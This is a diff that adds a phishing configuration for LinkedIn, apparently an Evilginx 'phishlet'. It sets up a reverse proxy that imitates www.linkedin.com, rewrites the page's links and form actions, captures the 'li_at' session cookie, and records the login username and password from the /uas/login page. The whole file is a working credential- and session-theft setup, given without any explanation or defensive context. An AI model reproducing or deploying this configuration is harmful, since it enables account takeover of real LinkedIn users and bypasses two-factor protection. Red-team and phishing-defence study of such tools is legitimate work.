@@ -1,0 +1,20 @@
+name: 'linkedin'
+author: '@mrgretzky'
+min_ver: '2.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
+sub_filters:
+  - {hostname: 'www.linkedin.com', sub: 'www', domain: 'linkedin.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'www.linkedin.com', sub: 'www', domain: 'linkedin.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'www.linkedin.com', sub: 'www', domain: 'linkedin.com', search: '//{hostname}/nhome/', replace: '//{hostname}/nhome/', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: 'www.linkedin.com'
+    keys: ['li_at']
+user_regex:
+  key: 'session_key'
+  re: '(.*)'
+pass_regex:
+  key: 'session_password'
+  re: '(.*)'
+landing_path:
+  - '/uas/login'
